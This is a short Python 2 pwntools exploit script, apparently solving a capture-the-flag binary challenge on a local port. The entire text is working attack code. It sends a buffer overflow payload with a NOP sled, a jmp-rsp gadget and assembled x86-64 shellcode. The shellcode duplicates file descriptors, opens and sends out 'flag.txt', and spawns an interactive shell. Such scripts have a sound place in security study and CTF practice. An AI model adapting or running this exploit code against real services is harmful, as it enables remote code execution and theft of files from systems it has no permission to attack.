from pwn import *
import time


p = remote('localhost',8096)

jmprsp = 0x000000000040185d

stepone = """
    mov rdi, rax
    mov dil, 2
    mov al, 32
    syscall
    dec eax
    
    xchg rdi, rax
    xor rax, rax
    mov dl, 100
    syscall
    
"""

steptwo = """
    mov r10, rdi
top:
    mov rsi, rbx
    xor rax, rax
    mov al, 33
    syscall
    inc rbx
    cmp bl, 3
    jne top

    xor rax, rax
    mov rdx, rax
    mov rsi, rax
    lea rdi, [rsp-48]
    mov al, 2
    syscall

    mov rsi, rax
    mov rdi, r10
    mov r10b, 100
    mov al, 40
    syscall
    
"""

shellcode = asm(stepone, arch='amd64')
print len(shellcode)
step2 = asm(steptwo, arch='amd64')


jump = '\xeb\xe2'




p.sendline('done' + "/bin/sh\x00" + "\x90"*(28-len(shellcode)) + shellcode + p64(jmprsp) + jump)
p.interactive()

p.sendline('flag.txt\x00' + '\x90'*39 + step2)


p.interactive()
